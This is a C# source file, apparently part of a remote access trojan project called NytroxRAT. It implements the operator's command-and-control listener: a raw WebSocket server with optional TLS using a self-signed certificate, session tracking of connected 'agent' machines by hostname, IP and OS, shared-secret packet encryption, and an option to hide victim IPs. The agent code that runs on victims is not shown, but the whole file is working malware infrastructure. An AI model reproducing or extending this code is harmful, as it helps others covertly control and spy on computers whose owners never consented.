using System.Collections.Concurrent;
using System.IO;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Net.WebSockets;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.Json;
using NytroxRAT.Shared.Crypto;
using NytroxRAT.Shared.Models;

namespace NytroxRAT.Client;

public class AgentSession
{
    public string    Id          { get; } = Guid.NewGuid().ToString("N")[..8].ToUpper();
    public string    Hostname    { get; set; } = "Unknown";
    public string    IpAddress   { get; set; } = "";
    public string    OsVersion   { get; set; } = "";
    public bool      HideIp      { get; set; } = false;
    public bool      IsWss       { get; set; } = false;
    public DateTime  ConnectedAt { get; } = DateTime.Now;
    public bool      IsActive    => _wsOpen;
    internal volatile bool _wsOpen = false;
    internal ManagedWebSocket? MWS { get; set; }
    public byte[]?   CryptoKey   { get; set; }
    public readonly SemaphoreSlim Lock = new(1, 1);
    public string DisplayName =>
        HideIp
            ? (Hostname == "Unknown" || Hostname == IpAddress ? "[HIDDEN]" : $"{Hostname} ([HIDDEN])")
            : (Hostname == "Unknown" || Hostname == IpAddress ? IpAddress  : $"{Hostname} ({IpAddress})");
}

public class ManagedWebSocket
{
    private readonly Stream _stream;
    private readonly SemaphoreSlim _sendLock = new(1, 1);

    public ManagedWebSocket(Stream stream) { _stream = stream; }

    public async Task<(byte[]? data, bool close)> ReceiveAsync(CancellationToken ct)
    {
        var hdr = new byte[2];
        if (!await ReadExact(_stream, hdr, ct)) return (null, true);
        int opcode = hdr[0] & 0x0F;
        bool masked = (hdr[1] & 0x80) != 0;
        long payLen = hdr[1] & 0x7F;

        if (opcode == 8) return (null, true);
        if (opcode == 9) { try { await _stream.WriteAsync(new byte[]{0x8A,0x00}, ct); } catch {} return (Array.Empty<byte>(), false); }

        if (payLen == 126) { var e = new byte[2]; if (!await ReadExact(_stream, e, ct)) return (null, true); payLen = (e[0]<<8)|e[1]; }
        else if (payLen == 127) { var e = new byte[8]; if (!await ReadExact(_stream, e, ct)) return (null, true); payLen = 0; for (int i=0;i<8;i++) payLen=(payLen<<8)|e[i]; }

        const long MaxPayloadBytes = 20 * 1024 * 1024;
        if (payLen < 0 || payLen > MaxPayloadBytes) return (null, true);
        var len = (int)payLen;

        byte[]? mask = null;
        if (masked) { mask = new byte[4]; if (!await ReadExact(_stream, mask, ct)) return (null, true); }

        var payload = new byte[len];
        if (len > 0 && !await ReadExact(_stream, payload, ct)) return (null, true);
        if (masked && mask != null) for (var i = 0; i < len; i++) payload[i] ^= mask[i % 4];
        return (payload, false);
    }

    public async Task SendAsync(byte[] data, CancellationToken ct)
    {
        await _sendLock.WaitAsync(ct);
        try
        {
            using var ms = new MemoryStream();
            ms.WriteByte(0x81);
            if (data.Length < 126)       ms.WriteByte((byte)data.Length);
            else if (data.Length<=65535) { ms.WriteByte(126); ms.WriteByte((byte)(data.Length>>8)); ms.WriteByte((byte)(data.Length&0xFF)); }
            else { ms.WriteByte(127); for(int i=7;i>=0;i--) ms.WriteByte((byte)((data.Length>>(i*8))&0xFF)); }
            ms.Write(data);
            var frame = ms.ToArray();
            await _stream.WriteAsync(frame, ct);
            await _stream.FlushAsync(ct);
        }
        finally { _sendLock.Release(); }
    }

    public async Task CloseAsync()
    {
        try { await _stream.WriteAsync(new byte[]{0x88,0x00}); await _stream.FlushAsync(); } catch {}
    }

    private static async Task<bool> ReadExact(Stream s, byte[] buf, CancellationToken ct)
    {
        int total = 0;
        while (total < buf.Length)
        {
            int n = await s.ReadAsync(buf.AsMemory(total, buf.Length - total), ct);
            if (n == 0) return false;
            total += n;
        }
        return true;
    }
}

public class ClientListener : IDisposable
{
    private TcpListener?             _tcp;
    private CancellationTokenSource? _cts;
    private byte[]?                  _cryptoKey;
    private bool                     _useWss;
    private X509Certificate2?        _cert;
    private readonly ConcurrentDictionary<string, AgentSession> _sessions = new();

    public IEnumerable<AgentSession> Sessions => _sessions.Values;

    public event Action<AgentSession>?         AgentConnected;
    public event Action<AgentSession>?         AgentDisconnected;
    public event Action<AgentSession, Packet>? PacketReceived;

    public string[] StartListening(int port, string secret, bool useWss = false)
    {
        StopListening();
        _cryptoKey = PacketCrypto.DeriveKey(secret);
        _useWss    = useWss;
        _cts       = new CancellationTokenSource();

        if (useWss) _cert = GetOrCreateCert();

        _tcp = new TcpListener(IPAddress.Any, port);
        _tcp.Server.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
        _tcp.Start();
        _ = AcceptLoop(_cts.Token);

        var scheme = useWss ? "wss" : "ws";
        return GetLocalIPs().Select(ip => $"{scheme}://{ip}:{port}").ToArray()
               is { Length: > 0 } arr ? arr : new[] { $"{scheme}://localhost:{port}" };
    }

    public void StopListening()
    {
        _cts?.Cancel();
        try { _tcp?.Stop(); } catch { }
        _tcp = null;
        foreach (var s in _sessions.Values)
            try { s.MWS?.CloseAsync().Wait(300); s._wsOpen = false; } catch { }
        _sessions.Clear();
    }

    private async Task AcceptLoop(CancellationToken ct)
    {
        while (!ct.IsCancellationRequested)
        {
            try
            {
                var client = await _tcp!.AcceptTcpClientAsync(ct);
                client.NoDelay = true;
                client.ReceiveBufferSize = 20 * 1024 * 1024;
                client.SendBufferSize    = 20 * 1024 * 1024;
                _ = HandleClient(client, ct);
            }
            catch (OperationCanceledException) { break; }
            catch { /* ignore transient errors, keep listening */ }
        }
    }

    private async Task HandleClient(TcpClient client, CancellationToken ct)
    {
        AgentSession? session = null;
        Stream stream = client.GetStream();
        try
        {
            var remoteIp = ((IPEndPoint)client.Client.RemoteEndPoint!).Address.ToString();

            if (_useWss && _cert != null)
            {
                try
                {
                    var ssl = new SslStream(stream, false);
                    await ssl.AuthenticateAsServerAsync(
                        new SslServerAuthenticationOptions
                        {
                            ServerCertificate         = _cert,
                            ClientCertificateRequired = false,
                            EnabledSslProtocols       = System.Security.Authentication.SslProtocols.Tls12
                                                      | System.Security.Authentication.SslProtocols.Tls13,
                            CertificateRevocationCheckMode = X509RevocationMode.NoCheck
                        }, ct);
                    stream = ssl;
                }
                catch
                {
                    try { client.Close(); } catch { }
                    return;
                }
            }

            var (mws, hideIp) = await DoHandshake(stream, ct);
            if (mws == null) return;

            session = new AgentSession
            {
                IpAddress = remoteIp,
                Hostname  = remoteIp,
                HideIp    = hideIp,
                IsWss     = _useWss,
                MWS       = mws,
                CryptoKey = _cryptoKey
            };
            session._wsOpen = true;
            _sessions[session.Id] = session;
            AgentConnected?.Invoke(session);

            while (session._wsOpen && !ct.IsCancellationRequested)
            {
                var (data, close) = await mws.ReceiveAsync(ct);
                if (close || data == null) break;
                if (data.Length == 0) continue;

                Packet? pkt;
                try { pkt = JsonSerializer.Deserialize<Packet>(data); }
                catch { continue; }
                if (pkt == null) continue;

                if (session.CryptoKey != null && !string.IsNullOrEmpty(pkt.Payload))
                    try { pkt.Payload = PacketCrypto.DecryptJson(pkt.Payload, session.CryptoKey); } catch { }

                if (pkt.Type == PacketType.SystemStats)
                    try
                    {
                        var s = JsonSerializer.Deserialize<SystemStatsPayload>(pkt.Payload);
                        if (s != null) { session.Hostname = s.Hostname; session.OsVersion = s.OsVersion; }
                    }
                    catch { }

                PacketReceived?.Invoke(session, pkt);
            }
        }
        catch { }
        finally
        {
            if (session != null)
            {
                session._wsOpen = false;
                _sessions.TryRemove(session.Id, out _);
                AgentDisconnected?.Invoke(session);
            }
            try { stream.Close(); client.Close(); } catch { }
        }
    }

    private static async Task<(ManagedWebSocket? mws, bool hideIp)> DoHandshake(Stream stream, CancellationToken ct)
    {
        try
        {
            var sb  = new StringBuilder();
            var buf = new byte[1];
            while (true)
            {
                int n = await stream.ReadAsync(buf.AsMemory(0, 1), ct);
                if (n == 0) return (null, false);
                sb.Append((char)buf[0]);
                if (sb.Length >= 4 && sb.ToString(sb.Length - 4, 4) == "\r\n\r\n") break;
                if (sb.Length > 8192) return (null, false);
            }
            var headers = sb.ToString();
            var keyLine = headers.Split("\r\n")
                .FirstOrDefault(l => l.StartsWith("Sec-WebSocket-Key:", StringComparison.OrdinalIgnoreCase));
            if (keyLine == null) return (null, false);
            var clientKey = keyLine.Split(':', 2)[1].Trim();
            var acceptKey = Convert.ToBase64String(
                SHA1.HashData(Encoding.UTF8.GetBytes(clientKey + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11")));
            bool hideIp = headers.Split("\r\n")
                .Any(l => l.StartsWith("X-Hide-Ip:", StringComparison.OrdinalIgnoreCase) && l.Contains("1"));
            var response = "HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n" +
                           $"Sec-WebSocket-Accept: {acceptKey}\r\n\r\n";
            await stream.WriteAsync(Encoding.UTF8.GetBytes(response), ct);
            await stream.FlushAsync(ct);
            return (new ManagedWebSocket(stream), hideIp);
        }
        catch { return (null, false); }
    }

    public async Task SendAsync(AgentSession session, Packet packet)
    {
        if (!session.IsActive || session.MWS == null) return;
        try
        {
            if (session.CryptoKey != null && !string.IsNullOrEmpty(packet.Payload))
                packet.Payload = PacketCrypto.EncryptJson(packet.Payload, session.CryptoKey);
            var bytes = JsonSerializer.SerializeToUtf8Bytes(packet);
            await session.Lock.WaitAsync();
            try { if (session.IsActive) await session.MWS.SendAsync(bytes, CancellationToken.None); }
            finally { session.Lock.Release(); }
        }
        catch { /* never propagate — send errors must not kill the session */ }
    }

    // ── Certificate — no admin required, uses CurrentUser store ──────────
    private static X509Certificate2 GetOrCreateCert()
    {
        // Try to load existing cert from user store
        using var store = new X509Store(StoreName.My, StoreLocation.CurrentUser);
        store.Open(OpenFlags.ReadWrite);
        var existing = store.Certificates
            .Find(X509FindType.FindBySubjectName, "NytroxRAT", false)
            .OfType<X509Certificate2>()
            .FirstOrDefault(c => c.NotAfter > DateTime.UtcNow.AddDays(7) && c.HasPrivateKey);
        if (existing != null) { store.Close(); return existing; }

        // Generate new self-signed cert — no admin needed
        using var rsa = RSA.Create(2048);
        var req = new CertificateRequest("CN=NytroxRAT", rsa, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
        req.CertificateExtensions.Add(new X509KeyUsageExtension(
            X509KeyUsageFlags.DigitalSignature | X509KeyUsageFlags.KeyEncipherment, false));
        req.CertificateExtensions.Add(new X509EnhancedKeyUsageExtension(
            new OidCollection { new Oid("1.3.6.1.5.5.7.3.1") }, false));

        // Only add DNS names — IPAddress.Any in SAN causes issues
        var san = new SubjectAlternativeNameBuilder();
        san.AddDnsName("localhost");
        foreach (var ip in GetLocalIPs())
            try { san.AddIpAddress(IPAddress.Parse(ip)); } catch { }
        req.CertificateExtensions.Add(san.Build());

        var cert = req.CreateSelfSigned(DateTimeOffset.UtcNow.AddDays(-1), DateTimeOffset.UtcNow.AddYears(5));

        // Export/reimport with Ephemeral flag — works without admin
        var pfx   = cert.Export(X509ContentType.Pfx, "nytrox");
        var cert2 = X509CertificateLoader.LoadPkcs12(pfx, "nytrox",
            X509KeyStorageFlags.UserKeySet | X509KeyStorageFlags.Exportable);

        // Persist to user store so we don't regenerate every time
        try { store.Add(cert2); } catch { }
        store.Close();
        return cert2;
    }

    private static IEnumerable<string> GetLocalIPs() =>
        System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces()
            .Where(n => n.OperationalStatus == System.Net.NetworkInformation.OperationalStatus.Up)
            .SelectMany(n => n.GetIPProperties().UnicastAddresses)
            .Where(a => a.Address.AddressFamily == AddressFamily.InterNetwork && !IPAddress.IsLoopback(a.Address))
            .Select(a => a.Address.ToString());

    public void Dispose() => StopListening();
}
